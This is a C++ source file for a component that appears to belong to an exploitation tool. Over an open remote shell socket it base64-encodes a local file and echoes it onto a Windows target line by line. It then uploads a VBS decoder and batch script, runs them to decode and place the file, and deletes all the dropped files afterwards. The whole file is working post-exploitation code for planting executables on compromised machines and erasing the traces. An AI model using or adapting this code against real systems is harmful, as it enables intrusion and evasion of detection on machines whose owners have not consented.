UploadFileInBase64::UploadFileInBase64(const char *originalFile, const char *destinationFile):
		original(originalFile),
		destination(destinationFile)
	{
		vbs = Random::createRandomFileName(8, ".vbs");
		base64 = Random::createRandomFileName(8, ".bin");
		bat = Random::createRandomFileName(8, ".bat");
		exe = Random::createRandomFileName(8, ".exe");
		dec = Random::createRandomFileName(8, ".bin");
	}

	bool UploadFileInBase64::upload(SOCKET socket){
		unsigned char *buffer;
		char *encoded;
		size_t length;
		size_t outputLength;
		buffer = readFile(original, &length);
		if (buffer == 0){
			MYPRINTF("Error read file\n");
			return false;
		}
		Base64 base64;
		encoded = base64.encode(buffer, length, &outputLength);
		bool result = true;
		if (!writeFile(encoded, outputLength)){
			MYPRINTF("Unable to write file\n");
			result = false;
		}
		delete[] buffer;
		delete[] encoded;

		if (result){
			if (!uploadB64File(socket)){
				result = false;
			} else if (!uploadDecoder(socket)){
				result = false;
			} else if (!decodeAndExecute(socket)){
				result = false;
			}
		}

		if(remove(this->base64.c_str()) != 0) {
				MYPRINTF("Error deleting file\n");
		}
		if (!cleanup(socket)){
				MYPRINTF("Unable to cleanup\n");
		}
		return result;
	}

	void UploadFileInBase64::readResponseFromSocket(SOCKET socket, bool print){
		Tcp::readResponseFromSocket(socket, print);
	}
	// TODO: encode
	bool UploadFileInBase64::uploadDecoder(SOCKET socket){
		char buffer[600];
		MYPRINTF("upload decoder file\n");
		for (int i = 0; i < COUNTOF(decoder); i++){
			sprintf_s(buffer, COUNTOF(buffer), "echo %s>> %s\n", decoder[i], dec.c_str());
			size_t size = send(socket, buffer, (int)strlen(buffer), 0);
			if (size != strlen(buffer)){
				MYPRINTF("Problem during send\n");
				return false;
			}
			Sleep(200);
			readResponseFromSocket(socket, false);
		}
		return true;
	}

	bool UploadFileInBase64::uploadBatFile(SOCKET socket){
		char buffer[600];
		MYPRINTF("upload bat file\n");
		for (int i = 0; i < COUNTOF(commands); i++){
			sprintf_s(buffer, COUNTOF(buffer), "echo %s>> %s\n", commands[i], bat.c_str());
			size_t size = send(socket, buffer, (int)strlen(buffer), 0);
			if (size != strlen(buffer)){
				MYPRINTF("Problem during send\n");
				return false;
			}
			Sleep(200);
			readResponseFromSocket(socket);
		}
		return true;
	}

	bool UploadFileInBase64::executeBat(SOCKET socket){
		char buffer[256];

		sprintf_s(buffer, COUNTOF(buffer), "%s %s %s %s\n", bat.c_str(), vbs.c_str(), dec.c_str(), exe.c_str());
		send(socket, buffer, (int)strlen(buffer), 0);
		Sleep(2000);
		readResponseFromSocket(socket);
		return true;
	}

	bool UploadFileInBase64::executeVbs(SOCKET socket){
		char buffer[256];

		sprintf_s(buffer, COUNTOF(buffer), "cscript %s\n", vbs.c_str());
		send(socket, buffer, (int)strlen(buffer), 0);
		Sleep(15000);
		readResponseFromSocket(socket);
		return true;
	}

	bool UploadFileInBase64::decodeFile(SOCKET socket){
		char buffer[256];

		sprintf_s(buffer, COUNTOF(buffer), "%s %s %s\n", exe.c_str(), base64.c_str(), destination);
		send(socket, buffer, (int)strlen(buffer), 0);
		Sleep(10000);
		readResponseFromSocket(socket);
		return true;
	}



	bool UploadFileInBase64::decodeAndExecute(SOCKET socket){

		uploadBatFile(socket);

		executeBat(socket);

		executeVbs(socket);

		decodeFile(socket);

		return true;
	}

	bool UploadFileInBase64::cleanup(SOCKET socket){
		char buffer[256];

		sprintf_s(buffer, COUNTOF(buffer),  "del %s\n", bat.c_str());
		send(socket, buffer, (int)strlen(buffer), 0);
		Sleep(100);
		readResponseFromSocket(socket);

		sprintf_s(buffer, COUNTOF(buffer),  "del %s\n", exe.c_str());
		send(socket, buffer, (int)strlen(buffer), 0);
		Sleep(100);
		readResponseFromSocket(socket);

		sprintf_s(buffer, COUNTOF(buffer), "del %s\n", vbs.c_str());
		send(socket, buffer, (int)strlen(buffer), 0);
		Sleep(100);
		readResponseFromSocket(socket);

		sprintf_s(buffer, COUNTOF(buffer), "del %s\n", base64.c_str());
		send(socket, buffer, (int)strlen(buffer), 0);
		Sleep(100);
		readResponseFromSocket(socket);

		sprintf_s(buffer, COUNTOF(buffer), "del %s\n", dec.c_str());
		send(socket, buffer, (int)strlen(buffer), 0);
		Sleep(100);
		readResponseFromSocket(socket);

		return true;
	}



	unsigned char *UploadFileInBase64::readFile(const char *path, size_t *size){
		unsigned char * buffer;
		size_t result;
		FILE * file;
		errno_t err;

		if( (err  = fopen_s( &file, path, "rb" )) != 0 ) {
			MYPRINTF("Unable to fopen_s file\n");
			return false;
		}

		// obtain file size:
		fseek(file , 0 , SEEK_END);
		*size = ftell(file);
		rewind(file);

		// allocate memory to contain the whole file:
		// TODO:
		buffer = (unsigned char*) malloc(sizeof(char)**size);
		if (buffer == 0) {
			MYPRINTF("Memory error", stderr);
			return 0;
		}

		// copy the file into the buffer:
		result = fread(buffer, 1, *size, file);
		if (result != *size) {
			MYPRINTF("Reading error", stderr);
			return 0;
		}

		/* the whole file is now loaded in the memory buffer. */

		// terminate
		fclose(file);
		return buffer;
	}

	bool UploadFileInBase64::writeFile(char *buffer, size_t length){
		FILE * file;
		errno_t err;
		if( (err  = fopen_s( &file, base64.c_str(), "wb" )) != 0 ) {
			return false;
		}
		fwrite(buffer, 1, length, file);
		fclose(file);
		return true;
	}

	bool UploadFileInBase64::uploadB64File(SOCKET socket){
		//for file read	
		FILE* file;
		char  file_data[8192];
		int bytesReadFromFile = 0;
		errno_t err;
		char buffer[8192];

		if( (err  = fopen_s( &file, base64.c_str(), "rb" )) != 0 ) {
			MYPRINTF("Unable to fopen_s file\n");
			return false;
		} else {
			MYPRINTF("upload bin file\n");
			while ( (bytesReadFromFile = fread(file_data, sizeof(char), 8100, file)) != 0)
			{
				file_data[bytesReadFromFile] = '\0';
				sprintf_s(buffer, COUNTOF(buffer), "echo %s>> %s\n", file_data, base64.c_str());
				size_t size = send(socket, buffer, strlen(buffer), 0);
				if (size != strlen(buffer)){
					MYPRINTF("Problem during send\n");
					return false;
				}
				Sleep(200);
				readResponseFromSocket(socket, false);
			}
			fclose(file);
		}
		return true;

	}